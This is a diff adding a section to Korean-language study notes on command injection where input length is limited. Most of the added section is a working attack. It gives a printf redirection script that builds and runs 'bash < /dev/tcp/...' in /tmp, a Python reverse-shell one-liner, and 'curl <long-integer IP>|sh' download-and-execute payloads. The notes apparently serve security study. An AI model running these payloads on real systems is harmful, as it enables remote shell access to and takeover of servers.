@@ -153,3 +153,72 @@ Command Injection 취약점이 발생하지만 실행한 명령어의 결과가 
             ```
 
 <br/><br/><br/>
+
+## 입력 값의 길이가 제한된 환경
+애플리케이션에서 특정 기능을 수행할 때 필요한 데이터만 받고 처리하는 것을 권장함
+* EX: 서버의 네트워크 상태를 판별하는 기능
+    - IP 주소와 도메인 외에는 처리할 필요가 없으므로 길이를 통해 이를 제한하면 공격에 제약 사항이 발생함
+        | 종류 | 설명 |
+        |---|------|
+        | 도메인 | 길이를 예측할 수 없으므로 길이를 통해 제한할 수 없음 |
+        | IP 주소 | 길이가 정해져 있기 때문에 제한할 수 있음 <br/> &nbsp;&nbsp; - IPv4(```xxx.xxx.xxx.xxx```) 기준으로 16바이트 이상의 값을 입력 받을 필요가 없음 → 15바이트 이하의 데이터만 처리하도록 제한함 |
+
+<br/>
+
+* 리다이렉션(Redirection)을 이용하는 방법
+    - 셸의 기능인 라디이렉션(Redirection)을 이용해 임의 디렉토리에 파일을 생성하고 Bash, 파이썬 등읜 인터프리터를 이용해 실행함
+    - **예시 상황**: 입력 길이가 제한된 상황에서 공격자의 서버와 연결을 맺는 방법
+        + 공격 스크립트
+            ```bash
+            printf bas>/tmp/1
+            printf h>>/tmp/1
+            printf \<>>/tmp/1
+            printf /d>>/tmp/1
+            printf ev>>/tmp/1
+            printf /t>>/tmp/1
+            printf cp>>/tmp/1
+            printf />>/tmp/1
+            printf 1 >>/tmp/1
+            printf 2 >>/tmp/1
+            printf 7.>>/tmp/1
+            printf 0.>>/tmp/1
+            printf 0.>>/tmp/1
+            printf 1/>>/tmp/1
+            printf 1 >>/tmp/1
+            printf 2 >>/tmp/1
+            printf 3 >>/tmp/1
+            printf 4 >>/tmp/1 # /tmp 디렉토리에 "bash < /dev/tcp/127.0.0.1/1234를 삽입함
+            bash</tmp/1& # bash </tmp/1&을 실행하면 생성한 위의 명령어가 Bash를 통해 실행됨
+            ```
+        1. ```/tmp``` 디렉터리에 "bash < /dev/tcp/127.0.0.1/1234" 문자열을 삽입함
+            - ```/tmp``` 디렉터리는 누구나 읽고 쓸 수 있는 권한이 존재함
+                + 명령어 중 숫자가 포함된 경우 Bash에서 파일 디스크립터로 인식할 수 있음 → 숫자 뒤에 띄어쓰기를 삽입해야 함
+        2. ```bash </tmp/1&``` 명령어를 실행하면 1번에서 삽입한 명령어가 Bash를 통해 실행됨
+
+<br/>
+
+* IP 주소 변환을 이용하는 방법
+    - IP 주소 변환
+        + 짧은 길이의 도메인을 사용하거나, IP 형식을 long 자로형 형식으로 변환함
+        + 변환된 IP 주소는 다양한 애플리케이션에서도 해석이 가능하기 때문에 기능이 정상적으로 수행됨
+    - long 타입으로 변환 IP 주소를 이용하여 네트워크 도구를 이용한 리버스 셸(Reverse Shell) 공격을 수행함
+        1. IP 주소를 long 타입으로 변환함
+            ```python
+            #!/usr/bin/python3
+            import ipaddress
+            int(ipaddress.IPv4Address("127.0.0.1")) # 결과: 2130706433
+            ```
+        2. 공격자 웹 서버에 리버스 셸을 실행하는 스크립트를 사전에 업로드함
+            ```linux
+            python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+            ```
+        3. 공격 대상 서버에서 ```curl```을 실행 (공격자 서버의 IP를 long 타입으로 변환한 값으로 전달함)
+            ```
+            curl 2130706433|sh
+            $(curl 2130706433)
+            `curl 2130706433`
+            ```
+            + curl/wget 명령은 변환된 long 타입의 IP 주소를 해석하여 공격 대상 서버에서 공격자 웹 서버에 리버스 셸을 실행하는 스크립트를 받아옴 → 이를 실행하면 셸을 획득할 수 있음
+        4. 공격자 서버에서 미리 열어둔 포트에서 공격 대상 서버에 명령어를 전송할 수 있음
+
+<br/><br/><br/>
